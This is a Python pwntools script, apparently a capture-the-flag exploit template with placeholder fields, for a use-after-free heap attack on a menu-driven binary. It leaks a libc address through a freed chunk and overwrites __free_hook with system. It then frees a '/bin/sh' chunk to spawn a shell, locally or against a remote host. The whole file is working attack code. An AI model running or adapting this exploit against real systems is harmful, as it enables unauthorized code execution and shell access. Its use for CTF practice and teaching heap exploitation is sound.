#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Heap Exploitation Template - Use After Free / Double Free
Author: CTF Player
Date: {{date}}
Target: {{target}}
"""

from pwn import *

# 设置目标程序
binary = "./{{binary_name}}"
elf = ELF(binary)
libc = ELF("./libc.so.6")

# 设置上下文
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'

def exploit():
    # 连接方式选择
    if args.REMOTE:
        p = remote("{{remote_host}}", {{remote_port}})
    else:
        p = process(binary)

    # 调试设置
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')

    def add_chunk(size, data):
        p.sendlineafter(b"Choice: ", b"1")
        p.sendlineafter(b"Size: ", str(size).encode())
        p.sendafter(b"Data: ", data)

    def delete_chunk(idx):
        p.sendlineafter(b"Choice: ", b"2")
        p.sendlineafter(b"Index: ", str(idx).encode())

    def edit_chunk(idx, data):
        p.sendlineafter(b"Choice: ", b"3")
        p.sendlineafter(b"Index: ", str(idx).encode())
        p.sendafter(b"Data: ", data)

    def show_chunk(idx):
        p.sendlineafter(b"Choice: ", b"4")
        p.sendlineafter(b"Index: ", str(idx).encode())
        return p.recvline()

    # Heap exploitation steps

    # 1. 创建chunks
    add_chunk(0x80, b"A" * 0x80)  # chunk 0
    add_chunk(0x80, b"B" * 0x80)  # chunk 1
    add_chunk(0x80, b"C" * 0x80)  # chunk 2

    # 2. 释放chunks制造UAF
    delete_chunk(0)
    delete_chunk(1)

    # 3. 泄露libc地址
    result = show_chunk(0)  # UAF读取
    libc_leak = u64(result[:8])
    libc_base = libc_leak - {{libc_offset}}
    system_addr = libc_base + libc.symbols['system']
    free_hook = libc_base + libc.symbols['__free_hook']

    log.info(f"Libc leak: {hex(libc_leak)}")
    log.info(f"Libc base: {hex(libc_base)}")
    log.info(f"System: {hex(system_addr)}")
    log.info(f"Free hook: {hex(free_hook)}")

    # 4. 劫持free_hook
    add_chunk(0x80, p64(free_hook))  # 分配到free_hook
    edit_chunk(3, p64(system_addr))  # 修改free_hook为system

    # 5. 触发system("/bin/sh")
    add_chunk(0x80, b"/bin/sh\x00")
    delete_chunk(4)  # 触发free -> system("/bin/sh")

    # 获取shell
    p.interactive()

if __name__ == "__main__":
    exploit()
